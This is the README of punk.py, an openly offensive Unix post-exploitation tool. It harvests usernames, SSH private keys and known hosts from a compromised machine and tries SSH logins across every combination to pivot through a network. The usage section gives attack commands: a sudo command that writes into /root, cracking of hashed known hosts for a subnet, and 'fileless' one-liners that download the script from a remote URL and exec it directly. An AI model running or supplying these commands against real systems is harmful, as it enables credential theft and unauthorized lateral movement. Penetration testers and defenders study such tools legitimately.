# punk.py

*unix SSH post-exploitation 1337 tool*



## how it works

punk.py is a post-exploitation tool meant to help network pivoting from a compromised unix box.
It collect usernames, ssh keys and known hosts from a unix system, then it tries to connect via ssh to all the combinations found.
punk.py is wrote in order to work on both standard python2 and python3 interpreters.



## Screenshot

![screenshot from 2018-12-11 14-01-15](https://user-images.githubusercontent.com/635790/49803344-ce4a0000-fd4f-11e8-86f9-b49d7e31989a.png)



## examples

standard execution:

```
 ~$ ./punk.py
```

skip passwd checks and use a custom home path:

```
 ~$ ./punk.py --no-passwd --home /home/ldapusers/
```

execute commands with sudo:

```
 ~$ ./punk.py --run "sudo sh -c 'echo iamROOT>/root/hacked.txt'"
```

cracking ssh hashed known hosts:
```
 ~$ ./punk.py --crack 192.168.0.0/24
```

python2 one-liner fileless ( with --no-passwd parameter ):
```
 ~$ python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd
```

python3 one-liner fileless:
```
 ~$ python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
```



## TODO

 - improve private keys hunting including dsa keys
 - Recursion
 - SSH keys with password bruteforce
